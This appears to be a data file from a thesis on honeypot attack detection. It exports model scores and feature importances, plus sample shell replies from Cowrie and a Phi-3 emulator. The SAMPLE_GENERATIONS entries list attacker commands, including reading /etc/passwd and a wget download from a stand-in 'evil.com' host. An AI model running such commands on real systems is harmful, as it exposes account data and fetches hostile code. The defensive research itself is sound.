// ML training results from thesis (post-leakage fix)
export const ML_RESULTS = {
  botDetection: { lr: 0.9253, rf: 0.9903, xgb: 0.9892, best: "RandomForest" },
  tunnelDetection: { lr: 0.5489, rf: 0.9741, xgb: 0.9692, best: "XGBoost" },
  multiLabel: { lr: 0.6222, rf: 0.9493, xgb: 0.9521, best: "XGBoost" },
};

export const PER_LABEL_F1 = [
  { label: "Bruteforce",          f1: 0.940, recall: 0.948 },
  { label: "Malware Dropper",     f1: 0.972, recall: 0.959 },
  { label: "Reconnaissance",      f1: 0.963, recall: 0.950 },
  { label: "Lateral Movement",    f1: 0.996, recall: 0.994 },
  { label: "Credential Spray",    f1: 0.995, recall: 0.994 },
  { label: "Tunneling",           f1: 0.964, recall: 0.948 },
  { label: "Port Scan",           f1: 0.931, recall: 0.931 },
  { label: "Service Interaction", f1: 0.995, recall: 0.996 },
  { label: "Network Probe",       f1: 1.000, recall: 1.000 },
];

export const KFOLD_RESULTS = [
  { model: "LogisticRegression", task: "Bot", f1: 0.9306, std: 0.0012 },
  { model: "RandomForest",       task: "Bot", f1: 0.9914, std: 0.0008 },
  { model: "XGBoost",            task: "Bot", f1: 0.9909, std: 0.0008 },
  { model: "LogisticRegression", task: "Tunnel", f1: 0.5420, std: 0.0027 },
  { model: "RandomForest",       task: "Tunnel", f1: 0.9686, std: 0.0085 },
  { model: "XGBoost",            task: "Tunnel", f1: 0.9683, std: 0.0096 },
  { model: "LogisticRegression", task: "MultiLabel", f1: 0.5685, std: 0.0150 },
  { model: "RandomForest",       task: "MultiLabel", f1: 0.9251, std: 0.0065 },
  { model: "XGBoost",            task: "MultiLabel", f1: 0.9440, std: 0.0076 },
];

export const BOT_FEATURE_IMPORTANCE = [
  { feature: "cmd_count",          lr: 0.852, rf: 0.080, xgb: 0.776 },
  { feature: "max_inter_cmd_delay",lr: 8.932, rf: 0.065, xgb: 0.075 },
  { feature: "cmd_unique_count",   lr: 6.458, rf: 0.091, xgb: 0.003 },
  { feature: "cmd_entropy",        lr: 4.905, rf: 0.009, xgb: 0.005 },
  { feature: "avg_cmd_per_event",  lr: 0.641, rf: 0.136, xgb: 0.014 },
  { feature: "cmd_avg_length",     lr: 0.114, rf: 0.094, xgb: 0.007 },
  { feature: "min_inter_cmd_delay",lr: 1.058, rf: 0.070, xgb: 0.057 },
  { feature: "payload_entropy_max",lr: 1.543, rf: 0.047, xgb: 0.006 },
];

export const TUNNEL_FEATURE_IMPORTANCE = [
  { feature: "payload_entropy_max", rf: 0.203, xgb: 0.379 },
  { feature: "payload_entropy_avg", rf: 0.122, xgb: 0.083 },
  { feature: "cmd_max_length",      rf: 0.158, xgb: 0.019 },
  { feature: "cmd_avg_length",      rf: 0.097, xgb: 0.136 },
  { feature: "avg_payload_length",  rf: 0.096, xgb: 0.000 },
  { feature: "cmd_unique_count",    rf: 0.042, xgb: 0.094 },
];

export const SAMPLE_GENERATIONS = [
  { attacker: "su root",               cowrie: "Password: \\nsu: Authentication failure",    phi3: "Password: \\nsu: incorrect password" },
  { attacker: "uname -a",              cowrie: "Linux svr04 3.2.0-4-amd64 #1 SMP x86_64",    phi3: "Linux svr04 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1+deb7u1 x86_64 GNU/Linux" },
  { attacker: "cat /etc/passwd",        cowrie: "root:x:0:0:root:/root:/bin/bash\ndaemon...",  phi3: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1..." },
  { attacker: "wget http://evil.com/x", cowrie: "Saving to: 'x'  [100%]  saved",              phi3: "--2026-03-12-- http://evil.com/x\nSaving to: 'x'\n100% saved" },
];
